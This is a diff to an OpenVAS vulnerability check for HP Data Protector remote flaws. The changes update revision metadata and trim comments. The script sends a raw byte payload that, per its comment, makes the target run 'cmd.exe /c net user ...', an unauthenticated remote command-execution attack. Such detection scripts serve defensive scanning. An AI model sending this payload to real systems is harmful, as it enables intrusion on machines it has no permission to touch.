@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_hp_data_protector_multiple_vuln.nasl 11339 2018-09-11 14:25:52Z mmartin $
+# $Id: gb_hp_data_protector_multiple_vuln.nasl 11421 2018-09-17 06:58:23Z cfischer $
 #
 # HP (OpenView Storage) Data Protector Multiple Vulnerabilities
 #
@@ -29,14 +29,14 @@ CPE = "cpe:/a:hp:data_protector";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.804402");
-  script_version("$Revision: 11339 $");
+  script_version("$Revision: 11421 $");
   script_cve_id("CVE-2013-2344", "CVE-2013-2345", "CVE-2013-2346", "CVE-2013-2347",
                 "CVE-2013-2348", "CVE-2013-2349", "CVE-2013-2350", "CVE-2013-6195",
                 "CVE-2011-0923", "CVE-2014-2623");
   script_bugtraq_id(64647, 64647, 64647, 64647, 64647, 64647, 64647, 64647, 46234);
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-11 16:25:52 +0200 (Tue, 11 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-17 08:58:23 +0200 (Mon, 17 Sep 2018) $");
   script_tag(name:"creation_date", value:"2014-02-18 16:03:46 +0530 (Tue, 18 Feb 2014)");
   script_name("HP (OpenView Storage) Data Protector Multiple Vulnerabilities");
   script_category(ACT_ATTACK);
@@ -60,9 +60,7 @@ if(description)
   script_xref(name:"URL", value:"http://h20565.www2.hp.com/hpsc/doc/public/display?docId=emr_na-c03822422");
 
   script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to bypass certain security
-  restrictions, manipulate certain data, and compromise a vulnerable system.
-
-  Impact Level: System/Application");
+  restrictions, manipulate certain data, and compromise a vulnerable system.");
   script_tag(name:"affected", value:"HP (OpenView Storage) Data Protector v6.2X, v7.X, v8.X and v9.X");
   script_tag(name:"insight", value:"Multiple flaws are due to,
 
@@ -101,8 +99,7 @@ get_app_location( cpe:CPE, port:port, nofork:TRUE ); # To have a reference to th
 soc = open_sock_tcp( port );
 if( ! soc ) exit( 0 );
 
-##  Construct attack string
-## 'c:\windows\system32\cmd.exe' '/c net user usr p@ss!23 /help'
+# nb: Attack string: 'c:\windows\system32\cmd.exe' '/c net user usr p@ss!23 /help'
 hdpReq = raw_string(
         0x00, 0x00, 0x01, 0x3c, 0xff, 0xfe, 0x32, 0x00,
         0x00, 0x00, 0x20, 0x00, 0x68, 0x00, 0x70, 0x00,
@@ -147,12 +144,10 @@ hdpReq = raw_string(
         0x0a, 0x00, 0x0d, 0x00, 0x0a, 0x00, 0x00, 0x00,
         0x00, 0x00);
 
-## send the data
 send( socket:soc, data:hdpReq );
 
 sleep( 7 );
 
-## Receive the data
 hdpRes = recv( socket:soc, length:4096 );
 
 len = strlen( hdpRes );
